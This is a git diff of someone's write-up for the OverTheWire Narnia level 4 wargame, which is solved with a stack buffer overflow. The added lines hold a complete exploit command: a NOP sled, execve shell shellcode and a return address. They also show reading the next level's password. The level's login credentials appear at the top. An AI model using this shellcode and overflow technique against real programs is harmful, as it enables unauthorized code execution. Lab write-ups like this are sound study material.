@@ -4,7 +4,6 @@ ssh narnia4@narnia.labs.overthewire.org -p2226
 narnia4 / iqNWNk173q
 # concept
 * stack buffer overflow through binary argument variable
-* 
 # source code
 ```C
 #include <string.h>
@@ -85,7 +84,7 @@ dc
 ```
 * the length of the shellcode is `33` bytes
 * for our payload, we'll subtract `33` from our offset, and change the offset value from `A` to `\x90`, which is a NOP (no operation) character
-* our intended payload will be
+* our intended payload will be:
 ```
  231 NOP bytes
   33 shellcode bytes
@@ -106,14 +105,14 @@ dc
 * we see that the contents of `eip` is still `0x42424242`, which means that we have the correct length of payload
 * next, we'll take a look at `60` bytes behind the `esp` to see if we can find a memory address to return to
 ```
-px @ esp-60
+px @ esp-280
 ```
-* we see that memory address `0xffffdce4` is located close to the shellcode, and since the contents of that address is NOP bytes, the program execution should ride the NOP sled and straight into our shell code
+* we see that memory address `0xffffd540` is located close to the shellcode, and since the contents of that address is NOP bytes, the program execution should ride the NOP sled and straight into our shell code
 * the final adjustment to the `payload` file is this:
+```Bash
+./narnia4 `perl -e 'print "\x90" x 231 . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "\x40\xd5\xff\xff"'`
 ```
-
-```
-
+* the last thing to do is get the password for this user, which is located in the `/etc/narnia_pass` directory
 ```Bash
 cat /etc/narnia_pass/narnia5
 ```
